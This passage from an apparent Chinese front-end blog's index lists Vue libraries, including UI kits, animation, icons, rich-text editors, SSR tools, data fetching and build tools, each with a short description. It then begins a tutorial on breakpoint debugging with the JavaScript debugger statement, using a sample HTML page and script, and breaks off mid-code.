src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243888856-bb73498b-d853-43a7-b10a-e1c2e1fd0e28.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243888856-bb73498b-d853-43a7-b10a-e1c2e1fd0e28.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="NHWLF"></a></p><h2 id="（4）Trois"><a href="#（4）Trois" class="headerlink" title="（4）Trois"></a><br />（4）Trois</h2><p>Trois 是一个基于 Three.JS 的 Vue 3 可视化库，它是一个流行的 WebGL 库。 Three.JS 对桌面和移动设备都有很好的支持。 该库允许我们使用 VueJS 组件轻松为网站创建 3D 效果。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245369189-f6e12dc5-63a8-436a-829d-5832407e4054.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245369189-f6e12dc5-63a8-436a-829d-5832407e4054.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="LCfns"></a></p><h1 id="6-组件"><a href="#6-组件" class="headerlink" title="6. 组件"></a><br />6. 组件</h1><p><a name="CZ9Hk"></a></p><h2 id="（1）Vue-Grid-Layout"><a href="#（1）Vue-Grid-Layout" class="headerlink" title="（1）Vue Grid Layout"></a>（1）Vue Grid Layout</h2><p>vue-grid-layout 是一个网格布局系统，类似于 Gridster，用于 Vue.js。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244016211-ff1879e4-67aa-4b8c-b66c-4a4a8527bd09.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244016211-ff1879e4-67aa-4b8c-b66c-4a4a8527bd09.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="WblsY"></a></p><h2 id="（2）Vue-Draggable"><a href="#（2）Vue-Draggable" class="headerlink" title="（2）Vue Draggable"></a><br />（2）Vue Draggable</h2><p>Vue Draggable 是一个基于 Sortable.js 的 Vue 拖拽组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244136335-2177ad07-f931-4128-b3b6-759d17f87f5d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244136335-2177ad07-f931-4128-b3b6-759d17f87f5d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="yejts"></a></p><h2 id="（3）Vue-Tour"><a href="#（3）Vue-Tour" class="headerlink" title="（3）Vue Tour"></a><br />（3）Vue Tour</h2><p>Vue Tour 是一个轻量级、简单且可定制的导览插件，可与 Vue.js 一起使用。它提供了一种快速简便的方法来指导用户完成你的应用程序。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244866751-55d7e307-be4d-458e-8728-68e668d16875.png?x-oss-process=image/resize,w_953,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244866751-55d7e307-be4d-458e-8728-68e668d16875.png?x-oss-process=image/resize,w_953,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（4）Swiper.js</strong><br />Swiper 是一款免费以及轻量级的移动设备触控滑块的框架，使用硬件加速过渡。主要使用与移动端的网站、网页应用程序，以及原生的应用程序。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244941098-1d009d31-ee3e-4ddb-a30d-47084d4fdc87.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244941098-1d009d31-ee3e-4ddb-a30d-47084d4fdc87.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="AEitf"></a></p><h2 id="（5）vue-easytable"><a href="#（5）vue-easytable" class="headerlink" title="（5）vue-easytable"></a><br />（5）vue-easytable</h2><p>该库提供了一个功能齐全且高度可定制的表格组件&#x2F;数据网格。它支持许多功能，如虚拟滚动、列固定、标题固定、标题分组、过滤器、排序、单元格省略号、行扩展、行复选框等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246173207-b8a6cdb5-ba20-4cfa-a43e-d6ab58cd817a.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246173207-b8a6cdb5-ba20-4cfa-a43e-d6ab58cd817a.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ymS5x"></a></p><h1 id="7-UI-组件"><a href="#7-UI-组件" class="headerlink" title="7. UI 组件"></a><br />7. UI 组件</h1><p><a name="YPNro"></a></p><h2 id="（1）Element-Plus"><a href="#（1）Element-Plus" class="headerlink" title="（1）Element Plus"></a>（1）Element Plus</h2><p>Element Plus，由饿了么大前端团队开源出品的一套为开发者、设计师和产品经理准备的基于 Vue 3.0 的组件库，Element Plus 是基于 Vue3 面向设计师和开发者的组件库，提供了配套设计资源，帮助你的网站快速成型。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658236849005-d22c295f-4efa-4bab-aeb7-e845a79840cd.png?x-oss-process=image/resize,w_780,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658236849005-d22c295f-4efa-4bab-aeb7-e845a79840cd.png?x-oss-process=image/resize,w_780,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="OvSFU"></a></p><h2 id="（2）Vuetify"><a href="#（2）Vuetify" class="headerlink" title="（2）Vuetify"></a>（2）Vuetify</h2><p>Vuetify 是一个基于 Vue.js 精心打造 UI 组件库，整套 UI 设计为 Material 风格。能够让没有任何设计技能的开发者创造出时尚的 Material 风格界面。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658236907279-ca0790f0-a9da-4b06-9a05-aacda6929c5a.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658236907279-ca0790f0-a9da-4b06-9a05-aacda6929c5a.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="yf71Z"></a></p><h2 id="（3）Vant"><a href="#（3）Vant" class="headerlink" title="（3）Vant"></a><br />（3）Vant</h2><p>Vant 是一套轻量、可靠的移动端组件库。通过 Vant，可以快速搭建出风格统一的页面，提升开发效率，支持 Vue 3。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237411801-6a82c357-2294-4489-8652-d0d7152f8333.png?x-oss-process=image/resize,w_955,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237411801-6a82c357-2294-4489-8652-d0d7152f8333.png?x-oss-process=image/resize,w_955,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="l6DSl"></a></p><h2 id="（4）Naive-UI"><a href="#（4）Naive-UI" class="headerlink" title="（4）Naive UI"></a><br />（4）Naive UI</h2><p>Naive UI 是一款基于当前比较新的 Vue 3.0&#x2F;TypeScript 技栈开发的前端 UI 组件库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237717771-66f44c93-f6de-432a-8fea-74ac4f4c2a1c.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237717771-66f44c93-f6de-432a-8fea-74ac4f4c2a1c.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="EWKvZ"></a></p><h1 id="8-动画"><a href="#8-动画" class="headerlink" title="8. 动画"></a><br />8. 动画</h1><p><a name="RlDbD"></a></p><h2 id="（1）Animate-css"><a href="#（1）Animate-css" class="headerlink" title="（1）Animate.css"></a>（1）Animate.css</h2><p>animate.css 是一个使用CSS3的animation制作的动画效果的CSS集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237855634-9e42760e-330e-4174-9672-31fd389f0b40.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658237855634-9e42760e-330e-4174-9672-31fd389f0b40.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="zAOTJ"></a></p><h2 id="（2）Greensock"><a href="#（2）Greensock" class="headerlink" title="（2）Greensock"></a><br />（2）Greensock</h2><p>GreenSock是一个JavaScript动画库，可轻松对HTML元素进行动画处理。 用于创建高性能，零依赖性，跨浏览器动画，声称在超过 400 万个网站中使用。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238145678-e4baca0c-0a7d-45be-8741-246abfb71bbe.png?x-oss-process=image/resize,w_795,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238145678-e4baca0c-0a7d-45be-8741-246abfb71bbe.png?x-oss-process=image/resize,w_795,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="FyOdE"></a></p><h2 id="（3）Popmotion"><a href="#（3）Popmotion" class="headerlink" title="（3）Popmotion"></a><br />（3）Popmotion</h2><p>Popmotion 是一个只有12KB的 JavaScript 运动引擎，可以用来实现动画，物理效果和输入跟踪。原生的DOM支持：CSS，SVG，SVG路径和DOM属性的支持，开箱即用。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238362468-c97fe309-02bc-4cfe-8818-601d03e0ac8d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238362468-c97fe309-02bc-4cfe-8818-601d03e0ac8d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Uo62F"></a></p><h2 id="（4）Vue-Kinesis"><a href="#（4）Vue-Kinesis" class="headerlink" title="（4）Vue Kinesis"></a><br />（4）Vue Kinesis</h2><p>Vue Kinesis 支持使用 Vue.js 轻松创建复杂的交互式动画，其支持 Vue 3。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238626259-c41830ba-7488-4d4b-bdad-afeb51426550.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238626259-c41830ba-7488-4d4b-bdad-afeb51426550.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Ptqhj"></a></p><h1 id="9-图标"><a href="#9-图标" class="headerlink" title="9. 图标"></a><br />9. 图标</h1><p><a name="Mrqcu"></a></p><h2 id="（1）IconPark"><a href="#（1）IconPark" class="headerlink" title="（1）IconPark"></a>（1）IconPark</h2><p>IconPark 提供超过 2400 个高质量图标，还提供了每个图标的含义和来源的描述，便于开发者使用。除此之外，该网站还可以自定义图标，这是与其他图标网站与众不同的地方。该图标库是字节跳动旗下的技术驱动图标样式的开源图标库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892165-34d2445d-91f9-4184-8b2b-6a6f1a1b24e2.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892165-34d2445d-91f9-4184-8b2b-6a6f1a1b24e2.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="wrSdh"></a></p><h2 id="（2）Font-Awesome"><a href="#（2）Font-Awesome" class="headerlink" title="（2）Font Awesome"></a><br />（2）Font Awesome</h2><p>Font Awesome 提供了可缩放的矢量图标，可以使用CSS所提供的所有特性对它们进行更改，包括：大小、颜色、阴影或者其它任何支持的效果。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892145-d72b28e0-8701-464e-b691-8b938b91fdc2.png?x-oss-process=image/resize,w_838,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892145-d72b28e0-8701-464e-b691-8b938b91fdc2.png?x-oss-process=image/resize,w_838,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="NXs0v"></a></p><h2 id="（3）Ionicons"><a href="#（3）Ionicons" class="headerlink" title="（3）Ionicons"></a><br />（3）Ionicons</h2><p>Ionicons 是一个完全开源的图标集，是知名混合开发框架 Ionic Framework 内置的图标库，包含 1300 个设计优雅、风格统一的高质量图标，能满足大多数的业务场景。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892220-50e3abe8-88ce-4cb5-a169-5852a9168ea0.png?x-oss-process=image/resize,w_792,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892220-50e3abe8-88ce-4cb5-a169-5852a9168ea0.png?x-oss-process=image/resize,w_792,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Ytpi7"></a></p><h2 id="（4）Bootstrap-Icons"><a href="#（4）Bootstrap-Icons" class="headerlink" title="（4）Bootstrap Icons"></a><br />（4）Bootstrap Icons</h2><p>Bootstrap Icons 是 Bootstrap 开源的 SVG 图标库，此图标库起初专门针对其组件（从表单控件到导航）和文档进行定制设计和构建，现在可以免费用于任何项目。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892194-7bb1c0dd-f6e3-4acc-a42b-d81066841b10.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658238892194-7bb1c0dd-f6e3-4acc-a42b-d81066841b10.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="bSFKx"></a></p><h1 id="10-富文本编辑器"><a href="#10-富文本编辑器" class="headerlink" title="10. 富文本编辑器"></a><br />10. 富文本编辑器</h1><p><a name="ugxR9"></a></p><h2 id="（1）Tiptap"><a href="#（1）Tiptap" class="headerlink" title="（1）Tiptap"></a>（1）Tiptap</h2><p>Tiptap 是一个基于 Vue 的无渲染的富文本编辑器，它基于 Prosemirror，完全可扩展且无渲染。可以轻松地将自定义节点添加为Vue组件。使用无渲染组件（函数式组件），几乎完全控制标记和样式。菜单的外观或在DOM中的显示位置。这完全取决于使用者。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239070542-7d1881e5-6895-48e3-835b-60347593c1e7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239070542-7d1881e5-6895-48e3-835b-60347593c1e7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="iKndu"></a></p><h2 id="（2）Quill-js"><a href="#（2）Quill-js" class="headerlink" title="（2）Quill.js"></a><br />（2）Quill.js</h2><p>Quill.js 是一个具有跨平台和跨浏览器支持的富文本编辑器。凭借其可扩展架构和富有表现力的 API，可以完全自定义它以满足个性化的需求。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239127493-66aaeb22-6fe3-4efb-a41d-36f444b8137f.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239127493-66aaeb22-6fe3-4efb-a41d-36f444b8137f.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="JszhF"></a></p><h2 id="（3）TinyMCE"><a href="#（3）TinyMCE" class="headerlink" title="（3）TinyMCE"></a><br />（3）TinyMCE</h2><p>TinyMCE 是一个热门的富文本编辑器。它的目标是帮助其他开发人员构建精美的 Web 内容解决方案。它易于集成，可以部署在基于云的、自托管或混合环境中。该设置使得合并诸如 Angular、React 和 Vue 等框架成为可能。它还可以使用 50 多个插件进行扩展，每个插件都有 100 多个自定义选项。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239167968-a3ca0fe5-d35a-404f-968c-5a78c8ab6ac9.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239167968-a3ca0fe5-d35a-404f-968c-5a78c8ab6ac9.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="srS3i"></a></p><h2 id="（4）CKEditor-5"><a href="#（4）CKEditor-5" class="headerlink" title="（4）CKEditor 5"></a><br />（4）CKEditor 5</h2><p>CKEditor 是一个强大的富文本编辑器框架，具有模块化架构、现代集成和协作编辑等功能。它可以通过基于插件的架构进行扩展，从而可以将必要的内容处理功能引入。它是在 ES6 中从头开始编写的，并且具有出色的 webpack支持。可以使用与Angular、React和Vue.js的原生集成。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239213415-71bfed0f-d331-471a-bacc-beecf4548811.png?x-oss-process=image/resize,w_853,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239213415-71bfed0f-d331-471a-bacc-beecf4548811.png?x-oss-process=image/resize,w_853,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="RoXN9"></a></p><h1 id="11-服务端渲染"><a href="#11-服务端渲染" class="headerlink" title="11. 服务端渲染"></a><br />11. 服务端渲染</h1><p><a name="o4GBT"></a></p><h2 id="（1）Nuxt-js"><a href="#（1）Nuxt-js" class="headerlink" title="（1）Nuxt.js"></a>（1）Nuxt.js</h2><p>Nuxt.js 是一个基于 Vue.js 的通用应用框架。通过对客户端&#x2F;服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 UI 渲染。它预设了利用 Vue.js 开发服务端渲染的应用所需要的各种配置。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239456606-2e79a410-44dc-4551-a754-03d333d79615.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658239456606-2e79a410-44dc-4551-a754-03d333d79615.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="iTCSa"></a></p><h2 id="（2）SSR"><a href="#（2）SSR" class="headerlink" title="（2）SSR"></a><br />（2）SSR</h2><p>ssr 框架是为前端框架在服务端渲染的场景下所打造的开箱即用的服务端渲染框架。面向 Serverless，同时支持 React，Vue2，Vue3。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240199585-5d031fd6-2d20-4c2a-b798-e362be63c7fe.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240199585-5d031fd6-2d20-4c2a-b798-e362be63c7fe.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="FTEyM"></a></p><h2 id="（3）Vue-meta"><a href="#（3）Vue-meta" class="headerlink" title="（3）Vue-meta"></a><br />（3）Vue-meta</h2><p>Vue-meta 是 Vue.js 的一个插件，它可以帮助你使用 SSR 支持管理 Vue.js 组件中的 HTML 元数据。Vue-meta 使用 Vue 的内置响应性使管理应用程序的元数据变得简单。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243064630-bf87b19d-815b-46ee-a47e-5f90e287c24f.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243064630-bf87b19d-815b-46ee-a47e-5f90e287c24f.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="G8zrq"></a></p><h1 id="12-数据获取"><a href="#12-数据获取" class="headerlink" title="12. 数据获取"></a><br />12. 数据获取</h1><p><a name="bGEpO"></a></p><h2 id="（1）Axios"><a href="#（1）Axios" class="headerlink" title="（1）Axios"></a>（1）Axios</h2><p>Axios 是一个基于promise 的网络请求库，作用于node.js和浏览器中。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245855529-91574ed1-2434-414f-a13e-1b3c1e7fee43.png?x-oss-process=image/resize,w_952,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245855529-91574ed1-2434-414f-a13e-1b3c1e7fee43.png?x-oss-process=image/resize,w_952,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="uCWIU"></a></p><h2 id="（2）vue-resource"><a href="#（2）vue-resource" class="headerlink" title="（2）vue-resource"></a><br />（2）vue-resource</h2><p>vue-resource是 Vue.js 的一款插件，它可以通过XMLHttpRequest或JSONP发起请求并处理响应。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245988797-334b4815-9a67-49f9-bfe8-04254a81f0e1.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658245988797-334b4815-9a67-49f9-bfe8-04254a81f0e1.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="s2XtZ"></a></p><h2 id="（3）vue-axios"><a href="#（3）vue-axios" class="headerlink" title="（3）vue-axios"></a><br />（3）vue-axios</h2><p>vue-axios 是一个将 axios 集成到 Vuejs 的小型库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246069841-a1466034-acb2-4a66-ac9b-c1ec926ab7e8.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246069841-a1466034-acb2-4a66-ac9b-c1ec926ab7e8.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="NEJk1"></a></p><h1 id="13-构建工具"><a href="#13-构建工具" class="headerlink" title="13. 构建工具"></a><br />13. 构建工具</h1><p><a name="TmHvW"></a></p><h2 id="（1）Vite"><a href="#（1）Vite" class="headerlink" title="（1）Vite"></a>（1）Vite</h2><p>Vite 是下一代前端开发与构建工具。Vite 意在提供开箱即用的配置，同时它的插件 API 和 JavaScript API 带来了高度的可扩展性，并有完整的类型支持。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246353785-4aecbd73-e51a-482f-b3aa-eceed2a3ee78.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246353785-4aecbd73-e51a-482f-b3aa-eceed2a3ee78.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="h8UOM"></a></p><h2 id="（2）Webpack"><a href="#（2）Webpack" class="headerlink" title="（2）Webpack"></a><br />（2）Webpack</h2><p>webpack 是一个用于现代JavaScript应用程序的静态模块打包工具。当 webpack 处理应用程序时，它会在内部构建一个依赖图(dependency graph)，此依赖图对应映射到项目所需的每个模块，并生成一个或多个 bundle。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246649786-ce029da9-a405-4cf9-98ab-e317cd8a4a6e.png?x-oss-process=image/resize,w_949,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658246649786-ce029da9-a405-4cf9-98ab-e317cd8a4a6e.png?x-oss-process=image/resize,w_949,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debug断点调试</title>
      <link href="/2021/08/22/frontend/browser/debug/debug-duan-dian-diao-shi/"/>
      <url>/2021/08/22/frontend/browser/debug/debug-duan-dian-diao-shi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="62glah"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前端开发中我们最常需要调试的部分是 JS ，在调试 JS 的过程中，我们最常使用的方法便是 debug 调试。何为 debug 调试？ debug调试又名断点调试，它指的是在程序指定位置设置断点，当程序运行到这个断点时会暂停执行并保留当前状态，我们可以通过查看暂停时的程序状态来定位和排查问题。</p><p>那么为什么我们需要用这种调试方法呢？实际开发中，当我们完成一个功能，但是发现在浏览器中未否生效时，如果没有很丰富的经验，我们很难直接定位到问题所在。因为这个时候程序已经完成了执行，程序中大部分使用过的变量已经被回收了。但是有了 debug 调试，我们可以在程序运行过程中实时查看它的运行状态，甚至可以一步一步得调试，来看每一个变量在每一步是如何变化的，这对我们排查异常非常有效。接下来我们来看以下几种常用的 debug 调试方法。</p><p><a name="wvsiew"></a></p><h3 id="1-代码中设置debugger断点或打印信息"><a href="#1-代码中设置debugger断点或打印信息" class="headerlink" title="1. 代码中设置debugger断点或打印信息"></a>1. 代码中设置debugger断点或打印信息</h3><p>最简单的 debug 方法，是在我们希望调试的代码前加上一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">debugger</span>;</span><br></pre></td></tr></table></figure><p>只需要这么一行代码，就能使得程序的滚滚推进戛然而止，并且停在你想要的位置。我们亲手尝试一下，先写下一段 HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>debug调试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;word&quot;</span>&gt;</span>这是一段文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;action.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再在与 HTML 文件的相同位置写下如下 JS ，命名为 action.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> 